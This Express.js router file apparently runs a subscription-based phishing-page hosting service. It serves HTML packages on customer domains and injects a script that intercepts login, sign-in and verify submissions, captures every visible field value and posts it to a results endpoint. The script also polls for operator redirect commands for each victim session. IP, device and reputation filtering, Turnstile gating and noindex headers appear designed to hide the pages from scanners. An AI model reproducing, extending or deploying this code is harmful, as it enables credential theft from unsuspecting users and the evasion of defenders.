import { Router } from "express";
import { timingSafeEqual } from "node:crypto";
import {
  deliverSessionCommand,
  findPackage,
  pageSubscriptionState,
  resolveUserPageSubscription,
  savePageResult,
  saveTrafficEvent,
  updateUserPageConfig
} from "../repositories/appRepository.js";
import {
  contentTypeFor,
  fetchPackageFile,
  previewFileForPackage,
  previewSourceForPackage,
  resolveRelativePath
} from "../services/packagePreview.js";
import {
  publicTurnstileConfig,
  turnstileSecretFor,
  verifyTurnstileToken
} from "../services/turnstile.js";
import { securityDecision } from "../services/securityRules.js";
import {
  createChallengeProof,
  createSourceChallengeProof,
  verifyChallengeProof,
  verifySourceChallengeProof
} from "../services/challengeProof.js";
import { clearSourceProofCookie, readSourceProofCookie, setSourceProofCookie } from "../services/sourceProofCookie.js";
import { runtimePackageForUserPage, runtimeScreenForFile } from "../services/runtimeScreens.js";
import { clientIp } from "../services/clientIp.js";
import { brandingImageForPackage } from "../services/runtimeBranding.js";
import {
  instrumentResultFields,
  serverNormalizedFieldManifest,
  signResultFieldManifest,
  trustedResultManifestFromPersistent,
  verifyResultFieldManifest
} from "../services/resultCapture.js";

export const runtimeRouter = Router();
const accessDeniedMessage = "ACCESS DENIED";
const pageExpiredMessage = "Page Expired Renew to continue using";

const runtimePayloadLimits = {
  config: 8 * 1024,
  security: 16 * 1024,
  traffic: 24 * 1024,
  result: 96 * 1024,
  command: 8 * 1024,
  verify: 16 * 1024
};

runtimeRouter.use((req, res, next) => {
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  next();
});

function normalizeHost(value = "") {
  return String(value)
    .trim()
    .toLowerCase()
    .replace(/^https?:\/\//, "")
    .replace(/\/.*$/, "")
    .replace(/:\d+$/, "");
}

function runtimeError(res, status, error, detail = {}) {
  res.status(status).json({ error, ...detail });
  return null;
}

function accessDenied(res, status = 403) {
  return runtimeError(res, status, accessDeniedMessage);
}

function expiredPageHtml() {
  return `<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="robots" content="noindex,nofollow">
  <title>Page Expired</title>
  <style>
    html, body { height: 100%; margin: 0; }
    body {
      display: grid;
      place-items: center;
      background: #070909;
      color: #f4fff8;
      font: 700 16px/1.45 Arial, sans-serif;
    }
    main {
      width: min(420px, calc(100% - 32px));
      padding: 28px;
      border: 1px solid rgba(255,255,255,.12);
      border-radius: 8px;
      text-align: center;
      background: rgba(255,255,255,.045);
    }
    h1 { margin: 0; font-size: clamp(1.35rem, 5vw, 2rem); }
  </style>
</head>
<body>
  <main><h1>${pageExpiredMessage}</h1></main>
</body>
</html>`;
}

function pageExpired(res, status = 402, options = {}) {
  if (options.html) {
    res.status(status);
    res.setHeader("Content-Type", "text/html; charset=utf-8");
    res.send(expiredPageHtml());
    return null;
  }
  return runtimeError(res, status, pageExpiredMessage, { reason: pageExpiredMessage });
}

function safeCompare(value, expected) {
  const a = Buffer.from(String(value || ""));
  const b = Buffer.from(String(expected || ""));
  if (a.length !== b.length) return false;
  return timingSafeEqual(a, b);
}

function payloadTooLarge(req, res, limit) {
  const size = Buffer.byteLength(JSON.stringify(req.body || {}), "utf8");
  if (size <= limit) return false;
  runtimeError(res, 413, "Runtime payload too large", { limit });
  return true;
}

function runtimeIdFrom(req) {
  return String(req.body?.userPageId || req.query?.userPageId || req.body?.pageId || req.query?.pageId || "").trim();
}

function validSessionId(value = "") {
  return /^[a-z0-9_.:-]{0,96}$/i.test(String(value || ""));
}

function relaySecretFor(page) {
  return page?.hostingConfig?.relaySecret
    || page?.hostingConfig?.cloudflareRelaySecret
    || page?.generatedFile?.relaySecret
    || "";
}

function allowedHostsFor(page) {
  return Array.from(new Set([
    page?.domain,
    page?.hostingConfig?.domain
  ].map(normalizeHost).filter(Boolean)));
}

function publicPageConfig(page, decision = null) {
  const security = page.securityConfig || {};
  const challengeRequired = Boolean(decision?.challengeRequired);
  const captchaRequired = Boolean(security.captcha || challengeRequired);
  return {
    id: page.id,
    pageId: page.slug,
    pageName: page.name,
    packageId: page.packageId,
    packageVersion: page.packageVersion,
    domain: page.domain,
    status: page.status,
    subscription: page.subscription,
    subscriptionState: pageSubscriptionState(page),
    hosting: {
      domain: page.hostingConfig?.domain || page.domain || "",
      hostingType: page.hostingConfig?.hostingType || "cpanel",
      installPath: page.hostingConfig?.installPath || "public_html",
      connectionType: page.hostingConfig?.connectionType || "cloudflare-worker",
      relayVerified: Boolean(page.hostingConfig?.relayVerified)
    },
    security: {
      domains: allowedHostsFor(page),
      captcha: Boolean(security.captcha),
      captchaRequired,
      challengeRequired,
      turnstile: {
        ...publicTurnstileConfig(security),
        enabled: captchaRequired
      },
      bannedIpCount: (security.bannedIps || []).length,
      whitelistIpCount: (security.whitelistIps || []).length,
      blockedDevices: security.blockedDevices || []
    },
    resultSettings: page.resultSettings || {},
    generatedFile: page.generatedFile || {},
    flow: page.flow || [],
    configs: page.configs || {}
  };
}

async function runtimeContext(req, res, options = {}) {
  const userPageId = runtimeIdFrom(req);
  if (!userPageId || userPageId.length > 120) {
    return runtimeError(res, 400, "Runtime page id required");
  }
  const page = await resolveUserPageSubscription(userPageId);
  if (!page) {
    return runtimeError(res, 404, "Runtime page not found");
  }

  const expectedSecret = relaySecretFor(page);
  const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret;
  if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
    return accessDenied(res);
  }
  req.deuceRelayTrusted = Boolean(expectedSecret);

  const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
  const allowedHosts = allowedHostsFor(page);
  if (allowedHosts.length && !clientHost) {
    return accessDenied(res);
  }
  if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
    return accessDenied(res);
  }

  const subscriptionState = pageSubscriptionState(page);
  if (subscriptionState.blocked) {
    return pageExpired(res, 402, options.expiredResponse === "html" ? { html: true } : {});
  }

  return { page, clientHost, ip: clientIp(req) };
}

async function enforceRuntimeSecurity(context, req, res) {
  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (decision.allowed) return decision;
  accessDenied(res);
  return null;
}
function sourceProofRequired(context, decision) {
  return Boolean(context.page.securityConfig?.captcha || decision?.challengeRequired);
}

function validSourceProof(context, req) {
  return verifySourceChallengeProof(readSourceProofCookie(req), {
    userPageId: context.page.id,
    ip: context.ip
  });
}

function enforceSourceProof(context, decision, req, res) {
  if (!sourceProofRequired(context, decision)) return true;
  if (validSourceProof(context, req)) return true;
  if (readSourceProofCookie(req)) clearSourceProofCookie(res);
  accessDenied(res);
  return false;
}

function packageContainsFile(pagePackage, file) {
  const cleanFile = String(file || "").replace(/^\/+/, "");
  const files = pagePackage.packageManifest?.files || [];
  return files.some((item) => (item.path || item) === cleanFile);
}

function runtimeAssetUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/runtime/source/asset?${params.toString()}`;
}

function runtimePageUrl(userPageId, file) {
  const params = new URLSearchParams({ userPageId, file });
  return `/api/runtime/source?${params.toString()}`;
}

function rewriteRuntimeHtml(html, { userPageId, file, screenId = "", screenName = "", fieldManifest = null, security = {}, forceTurnstile = false }) {
  const turnstile = publicTurnstileConfig(security);
  const turnstileConfig = {
    enabled: Boolean((turnstile.enabled || forceTurnstile) && turnstile.siteKey),
    siteKey: turnstile.siteKey || ""
  };
  const fieldCapture = instrumentResultFields(html, { screenFile: file, screenKey: screenId || file });
  const trustedFieldManifest = fieldManifest?.fields?.length
    ? trustedResultManifestFromPersistent(fieldManifest, { screenFile: file, screenId: screenId || file })
    : fieldCapture.manifest;
  const fieldManifestToken = signResultFieldManifest(trustedFieldManifest, { userPageId });
  const rewritten = fieldCapture.html.replace(/\b(src|href|action)=["']([^"']+)["']/gi, (match, attr, value) => {
    const resolved = resolveRelativePath(file, value);
    if (!resolved) return match;
    if (/\.html?$/i.test(resolved)) {
      return `${attr}="${runtimePageUrl(userPageId, resolved)}"`;
    }
    return `${attr}="${runtimeAssetUrl(userPageId, resolved)}"`;
  });

  const bridge = `<script>
(function () {
  const sessionKey = "deuce_session_" + ${JSON.stringify(userPageId)};
  const runtime = {
    userPageId: ${JSON.stringify(userPageId)},
    pageId: ${JSON.stringify(file)},
    screenName: ${JSON.stringify(screenName || file)},
    sessionId: getSessionId(),
    turnstile: ${JSON.stringify(turnstileConfig)},
    challengeProof: "",
    fieldManifestToken: ${JSON.stringify(fieldManifestToken)},
    fieldManifestRevision: ${JSON.stringify(trustedFieldManifest.revision)}
  };
  const apiBase = window.location.pathname.indexOf("/api/runtime/") === 0 ? "/api/runtime" : "/api";

  function endpoint(path) {
    return apiBase + "/" + String(path || "").replace(/^\\/+/, "");
  }

  function secureTransport(url) {
    try {
      const target = new URL(url, window.location.href);
      return target.protocol === "https:"
        || ["localhost", "127.0.0.1", "::1"].includes(target.hostname);
    } catch (error) {
      return false;
    }
  }

  function sameLocation(targetUrl) {
    try {
      const target = new URL(targetUrl, window.location.href);
      const current = new URL(window.location.href);
      return target.origin === current.origin
        && target.pathname === current.pathname
        && target.search === current.search
        && target.hash === current.hash;
    } catch (error) {
      return false;
    }
  }

  function getSessionId() {
    try {
      const existing = window.sessionStorage.getItem(sessionKey);
      if (existing) return existing;
      const next = "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
      window.sessionStorage.setItem(sessionKey, next);
      return next;
    } catch (error) {
      return "sess_" + Date.now().toString(36) + "_" + Math.random().toString(36).slice(2, 8);
    }
  }

  function pageLabel() {
    return runtime.screenName || runtime.pageId;
  }

  let lastSubmitter = null;

  function normalizedFieldType(input) {
    if (!input) return "text";
    if (input.tagName === "SELECT") return input.multiple ? "select-multiple" : "select";
    if (input.tagName === "TEXTAREA") return "textarea";
    return String(input.getAttribute("data-deuce-field-type") || input.type || "text").toLowerCase();
  }

  function fallbackFieldId(input, index) {
    const source = String(input.name || input.id || input.getAttribute("aria-label") || input.placeholder || "field")
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "_")
      .replace(/^_+|_+$/g, "")
      .slice(0, 48) || "field";
    return "client_" + source + "_" + String(index + 1);
  }

  function capturedFieldValue(input, groupedInputs) {
    const type = normalizedFieldType(input);
    if (type === "checkbox" || type === "radio") {
      const selected = groupedInputs.filter(function (item) { return item.checked; }).map(function (item) { return item.value || "on"; });
      if (type === "radio") return selected[0] || "";
      return selected;
    }
    if (type === "select-multiple") {
      return Array.from(input.selectedOptions || []).map(function (option) { return option.value || ""; });
    }
    return input.value || "";
  }

  function captureFields(inputs) {
    const eligible = Array.from(inputs || []).filter(function (input) {
      const type = normalizedFieldType(input);
      return input && !input.disabled && !["submit", "button", "reset", "file", "hidden", "image"].includes(type);
    });
    const grouped = new Map();
    eligible.forEach(function (input, index) {
      const id = input.getAttribute("data-deuce-field-id") || fallbackFieldId(input, index);
      if (!grouped.has(id)) grouped.set(id, []);
      grouped.get(id).push(input);
    });
    return Array.from(grouped.entries()).map(function (entry) {
      const id = entry[0];
      const groupedInputs = entry[1];
      const input = groupedInputs[0];
      return {
        id: id,
        type: normalizedFieldType(input),
        value: capturedFieldValue(input, groupedInputs)
      };
    });
  }

  function captureEnvelope(inputs, scopeId) {
    return {
      version: 1,
      source: "signed-runtime",
      manifestToken: runtime.fieldManifestToken,
      manifestRevision: runtime.fieldManifestRevision,
      scopeId: scopeId || "page",
      fields: captureFields(inputs)
    };
  }

  function nearestInputScope(control) {
    if (!control || !control.closest) return document;
    return control.closest("form, main, section, article, .container, .login-box, .login-container, .form, .card, .panel") || document;
  }

  function fallbackInputsFor(control) {
    const scope = nearestInputScope(control);
    const scopedInputs = scope.querySelectorAll ? scope.querySelectorAll("input, select, textarea") : [];
    const fields = Array.from(scopedInputs).filter(function (input) {
      return input && input.offsetParent !== null && !input.disabled;
    });
    if (fields.length) return fields;
    return Array.from(document.querySelectorAll("input, select, textarea")).filter(function (input) {
      return input && input.offsetParent !== null && !input.disabled;
    });
  }

  function controlLooksLikeSubmit(control) {
    const text = [
      control && control.textContent,
      control && control.value,
      control && control.id,
      control && control.name,
      control && control.className,
      control && control.getAttribute && control.getAttribute("aria-label")
    ].filter(Boolean).join(" ").toLowerCase();
    return /submit|login|log in|sign in|signin|continue|next|verify|confirm|proceed|send|validate|complete|enter/.test(text);
  }

  function setControlWaiting(control) {
    if (!control) return;
    if (!control.dataset.deuceOriginalText) control.dataset.deuceOriginalText = control.value || control.textContent || "Submit";
    control.disabled = true;
    control.setAttribute("aria-busy", "true");
    control.classList.add("deuce-runtime-waiting");
    if (control.tagName === "INPUT") {
      control.value = "Waiting...";
    } else if ("textContent" in control) {
      control.textContent = "Waiting...";
    }
  }

  function restoreControl(control) {
    if (!control) return;
    control.disabled = false;
    control.removeAttribute("aria-busy");
    control.removeAttribute("data-deuce-waiting");
    control.classList.remove("deuce-runtime-waiting");
    if (control.dataset.deuceOriginalText) {
      if (control.tagName === "INPUT") {
        control.value = control.dataset.deuceOriginalText;
      } else if ("textContent" in control) {
        control.textContent = control.dataset.deuceOriginalText;
      }
    }
  }

  function restoreForm(form, submitter) {
    if (!form) return;
    form.removeAttribute("data-deuce-waiting");
    submitButtons(form, submitter).forEach(restoreControl);
  }

  function turnstileMountFor(target) {
    const scope = nearestInputScope(target);
    let mount = scope.querySelector && scope.querySelector("[data-deuce-turnstile]");
    if (mount) return mount;
    mount = document.createElement("div");
    mount.setAttribute("data-deuce-turnstile", "true");
    mount.style.margin = "12px 0";
    if (target && target.parentNode) {
      target.parentNode.insertBefore(mount, target);
    } else if (scope && scope.appendChild) {
      scope.appendChild(mount);
    } else {
      document.body.appendChild(mount);
    }
    return mount;
  }

  function loadTurnstileScript() {
    if (!runtime.turnstile || !runtime.turnstile.enabled) return Promise.resolve();
    if (window.turnstile) return Promise.resolve();
    return new Promise(function (resolve, reject) {
      const existing = document.querySelector('script[src*="challenges.cloudflare.com/turnstile/v0/api.js"]');
      if (existing) {
        existing.addEventListener("load", resolve, { once: true });
        existing.addEventListener("error", reject, { once: true });
        return;
      }
      const script = document.createElement("script");
      script.src = "https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit";
      script.async = true;
      script.defer = true;
      script.onload = resolve;
      script.onerror = reject;
      document.head.appendChild(script);
    });
  }

  function verifyTurnstileFor(target) {
    if (!runtime.turnstile || !runtime.turnstile.enabled) return Promise.resolve(true);
    return loadTurnstileScript().then(function () {
      return new Promise(function (resolve) {
        const mount = turnstileMountFor(target);
        mount.innerHTML = "";
        const widgetId = window.turnstile.render(mount, {
          sitekey: runtime.turnstile.siteKey,
          callback: function (token) {
            send("verify-human", { token: token, screen: pageLabel() }).then(function (response) {
              if (!response || !response.ok) {
                resolve(false);
                return;
              }
              response.json().then(function (data) {
                runtime.challengeProof = data.challengeProof || "";
                resolve(Boolean(data.verified));
              }).catch(function () { resolve(false); });
            });
          },
          "error-callback": function () { resolve(false); },
          "expired-callback": function () { resolve(false); }
        });
        if (widgetId === undefined || widgetId === null) resolve(false);
      });
    }).catch(function () {
      send("traffic", {
        event: "turnstile_load_failed",
        screen: pageLabel(),
        result: "blocked",
        reason: "Turnstile could not load"
      });
      return false;
    });
  }

  
  function submitButtons(form, submitter) {
    const buttons = Array.from(form.querySelectorAll('button[type="submit"], button:not([type]), input[type="submit"]'));
    if (submitter && !buttons.includes(submitter)) buttons.unshift(submitter);
    return buttons;
  }

  function setWaitingState(form, submitter) {
    form.setAttribute("data-deuce-waiting", "true");
    submitButtons(form, submitter).forEach(function (button) {
      if (!button.dataset.deuceOriginalText) button.dataset.deuceOriginalText = button.value || button.textContent || "Submit";
      button.disabled = true;
      button.setAttribute("aria-busy", "true");
      button.classList.add("deuce-runtime-waiting");
      if (button.tagName === "INPUT") {
        button.value = "Waiting...";
      } else {
        button.textContent = "Waiting...";
      }
    });
  }

  function send(path, payload) {
    const target = endpoint(path);
    if (!secureTransport(target)) return Promise.resolve(null);
    return fetch(target, {
      method: "POST",
      keepalive: true,
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userPageId: runtime.userPageId,
        pageId: runtime.pageId,
        sessionId: runtime.sessionId,
        hostname: window.location.hostname,
        path: window.location.pathname,
        createdAt: new Date().toISOString(),
        challengeProof: runtime.challengeProof || "",
        screenFile: runtime.pageId,
        ...payload
      })
    }).catch(function () { return null; });
  }

  function sendResultPayload(capture, captureMode) {
    return send("results", {
      screen: pageLabel(),
      capture: capture,
      flow: [runtime.pageId],
      userAgent: navigator.userAgent
    }).then(function (response) {
      if (response && response.ok) return;
      send("traffic", {
        event: "result_submit_failed",
        screen: pageLabel(),
        result: "blocked",
        reason: response ? "Results endpoint rejected submission" : "Results endpoint unreachable",
        metadata: { captureMode: captureMode || "form", status: response && response.status }
      });
    });
  }

  function sendHeartbeat() {
    send("traffic", {
      event: "heartbeat",
      screen: pageLabel(),
      metadata: {
        visibility: document.visibilityState || "visible"
      }
    });
  }

  function handleRuntimeSubmit(form, submitter, event) {
    if (!form || !(form instanceof HTMLFormElement) || form.getAttribute("data-deuce-waiting") === "true") return;
    if (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    }
    if (typeof form.checkValidity === "function" && !form.checkValidity()) {
      if (typeof form.reportValidity === "function") form.reportValidity();
      return;
    }
    setWaitingState(form, submitter);
    const capture = captureEnvelope(form.elements || [], form.getAttribute("data-deuce-form-id") || "page");
    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed" });
    sendResultPayload(capture, "form");
    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed" });
    window.setTimeout(checkCommand, 400);
  }

  function handleFallbackSubmit(control, event) {
    if (!control || control.getAttribute("data-deuce-waiting") === "true") return;
    if (!controlLooksLikeSubmit(control)) return;
    const inputs = fallbackInputsFor(control);
    const capture = captureEnvelope(inputs, "page");
    if (!capture.fields.length) return;
    if (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    }
    control.setAttribute("data-deuce-waiting", "true");
    setControlWaiting(control);
    send("traffic", { event: "result_submit_attempt", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
    sendResultPayload(capture, "fallback");
    send("traffic", { event: "form_submit_waiting", screen: pageLabel(), result: "allowed", metadata: { captureMode: "fallback" } });
    window.setTimeout(checkCommand, 400);
  }

  send("traffic", { event: "page_load", screen: pageLabel() });
  sendHeartbeat();

  function checkCommand() {
    const params = new URLSearchParams({
      userPageId: runtime.userPageId,
      sessionId: runtime.sessionId
    });
    fetch(endpoint("session-command") + "?" + params.toString())
      .then(function (response) { return response.ok ? response.json() : null; })
      .then(function (data) {
        const command = data && data.command;
        if (command && command.action === "redirect" && command.targetUrl) {
          if (sameLocation(command.targetUrl)) {
            if (command.forceReload) window.location.reload();
            return;
          }
          window.location.href = command.targetUrl;
        }
      })
      .catch(function () {});
  }

  window.setInterval(checkCommand, 1500);
  window.setInterval(sendHeartbeat, 10000);

  document.addEventListener("click", function (event) {
    const button = event.target && event.target.closest ? event.target.closest('button, input[type="submit"], input[type="button"], a, [role="button"]') : null;
    if (!button) return;
    if (!button.form) {
      handleFallbackSubmit(button, event);
      return;
    }
    lastSubmitter = button;
    const type = String(button.getAttribute("type") || "submit").toLowerCase();
    if (type === "submit") handleRuntimeSubmit(button.form, button, event);
    else handleFallbackSubmit(button, event);
  }, true);

  document.addEventListener("submit", function (event) {
    const form = event.target;
    handleRuntimeSubmit(form, event.submitter || lastSubmitter, event);
  }, true);
})();
<\/script>`;

  const waitStyles = `<style>
.deuce-runtime-waiting {
  position: relative !important;
  pointer-events: none !important;
  opacity: 0.82 !important;
}
.deuce-runtime-waiting::after {
  content: "" !important;
  display: inline-block !important;
  width: 0.85em !important;
  height: 0.85em !important;
  margin-left: 0.5em !important;
  border: 2px solid currentColor !important;
  border-right-color: transparent !important;
  border-radius: 999px !important;
  vertical-align: -0.12em !important;
  animation: deuceRuntimeSpin 0.8s linear infinite !important;
}
@keyframes deuceRuntimeSpin {
  to { transform: rotate(360deg); }
}
</style>`;

  if (rewritten.includes("</body>")) return rewritten.replace("</body>", `${waitStyles}${bridge}</body>`);
  return `${rewritten}${waitStyles}${bridge}`;
}

async function packageForRuntimePage(page) {
  const currentPackage = await findPackage(page.packageId || page.slug);
  const pagePackage = runtimePackageForUserPage(page, currentPackage);
  if (!pagePackage) throw new Error("Runtime package not found");
  if (!currentPackage || pagePackage === currentPackage) return pagePackage;

  const currentManifest = currentPackage.packageManifest || {};
  const runtimeManifest = pagePackage.packageManifest || {};
  return {
    ...pagePackage,
    packageManifest: {
      ...runtimeManifest,
      ...(currentManifest.thumbnailDataUrl ? { thumbnailDataUrl: currentManifest.thumbnailDataUrl } : {}),
      ...(currentManifest.thumbnailPath ? { thumbnailPath: currentManifest.thumbnailPath } : {}),
      assets: runtimeManifest.assets?.length ? runtimeManifest.assets : currentManifest.assets || []
    }
  };
}

async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
  const context = await runtimeContext(req, res, { expiredResponse: asAsset ? "json" : "html" });
  if (!context) return;
  const securityDecisionResult = await enforceRuntimeSecurity(context, req, res);
  if (!securityDecisionResult) return;
  if (!enforceSourceProof(context, securityDecisionResult, req, res)) return;

  const pagePackage = await packageForRuntimePage(context.page);
  const requestedFile = String(req.query?.file || "");
  const file = requestedFile || previewFileForPackage(pagePackage);
  if (file.includes("..") || file.length > 240) {
    res.status(400).send("Invalid package file");
    return;
  }
  if (!file || !packageContainsFile(pagePackage, file)) {
    res.status(404).send("Package file not found");
    return;
  }
  if (asAsset && /\.html?$/i.test(file)) {
    res.status(404).send("Package asset not found");
    return;
  }
  const runtimeScreen = !asAsset && /\.html?$/i.test(file)
    ? runtimeScreenForFile(pagePackage, file)
    : null;
  if (!asAsset && /\.html?$/i.test(file) && !runtimeScreen) {
    res.status(404).send("Package screen not found");
    return;
  }

  const source = previewSourceForPackage(pagePackage, file);
  const response = await fetchPackageFile(source);
  if (asAsset || !/\.html?$/i.test(file)) {
    const buffer = Buffer.from(await response.arrayBuffer());
    res.setHeader("Content-Type", contentTypeFor(file));
    res.setHeader("Cache-Control", "no-store");
    res.send(buffer);
    return;
  }

  const html = await response.text();
  res.setHeader("Content-Type", "text/html; charset=utf-8");
  res.setHeader("Cache-Control", "no-store");
  res.setHeader("X-Robots-Tag", "noindex, nofollow");
  res.send(rewriteRuntimeHtml(html, {
    userPageId: context.page.id,
    file,
    screenId: runtimeScreen?.id || "",
    screenName: runtimeScreen?.name || file,
    fieldManifest: runtimeScreen?.fieldManifest || null,
    security: context.page.securityConfig || {},
    forceTurnstile: Boolean(securityDecisionResult.challengeRequired)
  }));
}

runtimeRouter.get("/config", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await enforceRuntimeSecurity(context, req, res);
  if (!decision) return;
  res.json({ config: publicPageConfig(context.page, decision) });
});

runtimeRouter.post("/config", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.config)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await enforceRuntimeSecurity(context, req, res);
  if (!decision) return;
  res.json({ config: publicPageConfig(context.page, decision) });
});


runtimeRouter.get("/branding", async (req, res) => {
  try {
    const context = await runtimeContext(req, res);
    if (!context) return;
    if (!await enforceRuntimeSecurity(context, req, res)) return;
    const pagePackage = await packageForRuntimePage(context.page);
    const image = await brandingImageForPackage(pagePackage);
    if (!image) {
      res.status(404).end();
      return;
    }
    res.setHeader("Content-Type", image.contentType);
    res.setHeader("Cache-Control", "no-store");
    res.setHeader("Content-Security-Policy", "default-src 'none'; sandbox");
    res.setHeader("Cross-Origin-Resource-Policy", "cross-origin");
    res.send(image.buffer);
  } catch (error) {
    console.warn("Runtime branding failed:", error.message);
    res.status(404).end();
  }
});
runtimeRouter.get("/source", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res);
  } catch (error) {
    console.warn("Runtime source failed:", error.message);
    res.status(400).send("Runtime source unavailable");
  }
});

runtimeRouter.get("/source/asset", async (req, res) => {
  try {
    await sendRuntimePackageFile(req, res, { asAsset: true });
  } catch (error) {
    console.warn("Runtime asset failed:", error.message);
    res.status(404).send("Runtime asset unavailable");
  }
});

runtimeRouter.post("/security/check", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.security)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ allowed: false, reason: accessDeniedMessage });
    return;
  }
  res.json({ ...decision, captchaRequired: Boolean(context.page.securityConfig?.captcha || decision.challengeRequired), ip: context.ip, host: context.clientHost });
});

runtimeRouter.post("/verify-human", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.verify)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ verified: false, reason: accessDeniedMessage });
    return;
  }

  const security = context.page.securityConfig || {};
  if (!security.captcha && !decision.challengeRequired) {
    res.json({ verified: true, skipped: true });
    return;
  }

  const result = await verifyTurnstileToken({
    token: req.body?.token || req.body?.["cf-turnstile-response"],
    secret: turnstileSecretFor(security),
    remoteIp: context.ip
  });
  if (result.success) {
    setSourceProofCookie(res, createSourceChallengeProof({
      userPageId: context.page.id,
      ip: context.ip
    }));
  }
  res.status(result.success ? 200 : 400).json({
    verified: result.success,
    reason: result.success ? "Verified" : accessDeniedMessage,
    challengeProof: result.success ? createChallengeProof({ userPageId: context.page.id, sessionId: req.body?.sessionId, ip: context.ip }) : ""
  });
});

runtimeRouter.post("/traffic", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.traffic)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  const event = await saveTrafficEvent({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    hostname: context.clientHost || req.body?.hostname,
    result: req.body?.result || (decision.allowed ? "allowed" : "blocked"),
    reason: req.body?.reason || decision.reason,
    metadata: {
      ...(req.body?.metadata || {}),
      screenFile: String(req.body?.screenFile || ""),
      deviceType: decision.deviceType || null,
      proxyType: decision.proxyType || null,
      reputation: decision.reputation || null,
      reputationStatus: decision.reputationStatus || null,
      challengeRequired: Boolean(decision.challengeRequired)
    }
  }, context.ip, req.headers["user-agent"]);
  res.status(201).json({
    event: decision.allowed ? event : { ...event, reason: accessDeniedMessage },
    allowed: decision.allowed,
    reason: decision.allowed ? decision.reason : accessDeniedMessage
  });
});

runtimeRouter.get("/session-command", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const sessionId = req.query?.sessionId || req.body?.sessionId;
  if (!validSessionId(sessionId)) return runtimeError(res, 400, "Invalid session id");
  const result = await deliverSessionCommand(context.page.id, sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/session-command", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.command)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  if (!validSessionId(req.body?.sessionId)) return runtimeError(res, 400, "Invalid session id");
  const result = await deliverSessionCommand(context.page.id, req.body?.sessionId);
  res.json(result || { command: null });
});

runtimeRouter.post("/results", async (req, res) => {
  if (payloadTooLarge(req, res, runtimePayloadLimits.result)) return;
  const context = await runtimeContext(req, res);
  if (!context) return;
  const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
  if (!decision.allowed) {
    res.status(403).json({ error: accessDeniedMessage });
    return;
  }
  if (decision.challengeRequired
    && !validSourceProof(context, req)
    && !verifyChallengeProof(req.body?.challengeProof, {
      userPageId: context.page.id,
      sessionId: req.body?.sessionId,
      ip: context.ip
    })) {
    res.status(403).json({ error: accessDeniedMessage });
    return;
  }
  let fieldManifest = null;
  if (req.body?.capture) {
    if (req.body.capture.source === "signed-runtime") {
      try {
        fieldManifest = verifyResultFieldManifest(req.body.capture.manifestToken, {
          userPageId: context.page.id,
          screenFile: req.body.screenFile
        });
        if (req.body.capture.manifestRevision !== fieldManifest.revision) {
          throw new Error("Result field manifest revision mismatch");
        }
      } catch {
        res.status(400).json({ error: "Result field manifest is invalid or expired" });
        return;
      }
    } else {
      fieldManifest = serverNormalizedFieldManifest(req.body.capture, { screenFile: req.body.screenFile });
    }
  }
  const result = await savePageResult({
    ...req.body,
    userPageId: context.page.id,
    pageId: context.page.slug,
    pageName: context.page.name,
    hostname: context.clientHost || req.body?.hostname
  }, context.ip, req.headers["user-agent"], { fieldManifest });
  res.status(201).json({ result });
});

runtimeRouter.post("/relay/verify", async (req, res) => {
  const context = await runtimeContext(req, res);
  if (!context) return;
  const hostingConfig = {
    ...(context.page.hostingConfig || {}),
    relayVerified: true,
    relayVerifiedAt: new Date().toISOString(),
    verified: true,
    verifiedAt: new Date().toISOString(),
    liveStatus: "Live"
  };
  await updateUserPageConfig(context.page.id, { hostingConfig });
  res.json({ ok: true, host: context.clientHost, userPageId: context.page.id });
});
